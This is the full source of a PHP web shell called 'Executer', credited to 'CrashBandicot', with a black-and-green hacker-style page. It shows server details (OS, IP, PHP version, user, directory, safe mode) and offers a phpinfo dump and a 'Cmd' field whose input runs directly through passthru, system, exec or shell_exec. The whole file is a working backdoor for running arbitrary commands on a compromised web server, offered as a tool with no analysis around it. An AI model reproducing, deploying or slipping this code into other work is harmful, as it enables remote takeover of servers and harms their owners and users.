<html><head></head><body>
<SCRIPT LANGUAGE="JavaScript">
var rev = "fwd"; 
function titlebar(val)
{
var msg = "./Executer";
var res = " ";
var speed = 100;
var pos = val;
msg = "./Executer";
var le = msg.length;
if(rev == "fwd"){
if(pos < le){
pos = pos+1;
scroll = msg.substr(0,pos);
document.title = scroll;
timer = window.setTimeout("titlebar("+pos+")",speed);}
else{
rev = "bwd";
timer = window.setTimeout("titlebar("+pos+")",speed);}}
else{
if(pos > 0){
pos = pos-1;
var ale = le-pos;
scrol = msg.substr(ale,le);
document.title = scrol;
timer = window.setTimeout("titlebar("+pos+")",speed);}
else{
rev = "fwd";
timer = window.setTimeout("titlebar("+pos+")",speed);
}}}
titlebar(0);
</script>

<style>
    body,input,table,select{background: black; font-family:Verdana,tahoma; color: #008000; font-size:11px; }
    a:link,a:active,a:visited{text-decoration: none;color: red;}
    a:hover {text-decoration: underline; color: red;}
    table,td,tr,#gg{ border-style:solid; text-decoration:bold; }
    tr:hover,td:hover{background-color: #FFFFCC; color:green;}
.box {border: 3px solid white; box-shadow:0px 7px 9px #FFF; width:250px; height:310px;}
    .oo:hover{background-color: black; color:white;}
    </style>
    <form method="POST" action="">
    <h2><center>~ Executer ~</h2></center><center><div class="box">
    <strong><h4><u>OS</u> :</strong> <i><td style="width:60px; height:20px;"><?php echo OS(); ?></td></i></h4>
    <strong><h4><u>IP</u> :</strong> <i><td style="width:60px; height:20px;"><?php echo $_SERVER['SERVER_ADDR']; ?></td></i></h4>
   	<strong><h4><u>PHP Version</u> :</strong> <i><td style="width:60px; height:20px;"><?php echo phpversion(); ?></td></i></h4>
   	<strong><h4><u>User :</u> :</strong> <i><td style="width:60px; height:20px;"><?php echo whoami(); ?></td></i></h4>
    <strong><h4><u>Dir</u> :</strong> <i><td style="width:60px; height:20px;"><?php echo getcwd(); ?></td></i></h4>
    <strong><h4><u>SafeMode</u> :</strong><i><td style="width:60px; height:20px;"> <?php echo SM(); ?></td></i><br><br></h4>
    <input type="submit" style="width:60px; height:20px;" name="info" value="phpinfo"/>
    <input type="submit" style="width:60px; height:20px;" name="about" value="About"/>
   	<strong><h4><u>Cmd</u> :</strong>  <input type="text" name="cmd" value="id" /><br><input type="submit" name="submit" style="width:60px; height:20px;" value="Pwn!"/></h4><br></center></div>
   </form>
</body>
</html>

<?php

/* https://cloud.githubusercontent.com/assets/8810334/4935164/3a4e9222-65a9-11e4-93d5-5c16ffdf5f3e.png - Screen */

if($_POST['submit']){ 
	if(function_exists('passthru')){$cmd = passthru($_POST['cmd']);}
	elseif(function_exists('system') && !$cmd){$cmd= system($_POST['cmd']); }
	elseif(function_exists('exec') && !$cmd){exec($_POST['cmd'],$zeb);$cmd=join("\n",$zeb);}
	elseif(function_exists('shell_exec') && !$cmd){$cmd=shell_exec($_POST['cmd']);}
	elseif($cmd){return $cmd;}
} elseif($_POST['info']) {
	echo "<style>
    body,input,table,select{background: black; font-family:Verdana,tahoma; color: #008000; font-size:11px; }</style><pre>".phpinfo()."</pre>";
} elseif($_POST['about']) { echo "<script>alert('Coder : CrashBandicot')</script>"; }
function SM()
{
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode){$safe_mode = 'OFF';}
    else {$safe_mode = 'ON';}
	return $safe_mode;
}
function whoami()
{
	if(function_exists('passthru')){$who = passthru("whoami");}
	elseif(function_exists('system') && !$who){$who= system("whoami"); }
	elseif(function_exists('exec') && !$who){exec("whoami",$zebi);$who=join("\n",$zebi);}
	elseif(function_exists('shell_exec') && !$who){$who=shell_exec("whoami");}
	elseif($who){return $who;}
}
function OS() {
if(PHP_OS == "WINNT"){ $os = "Windows"; } elseif(PHP_OS == "Linux"){ $os = "Linux"; } elseif(PHP_OS == "FreeBSD"){ $os = "FreeBSD"; }
return $os;
}
?> 
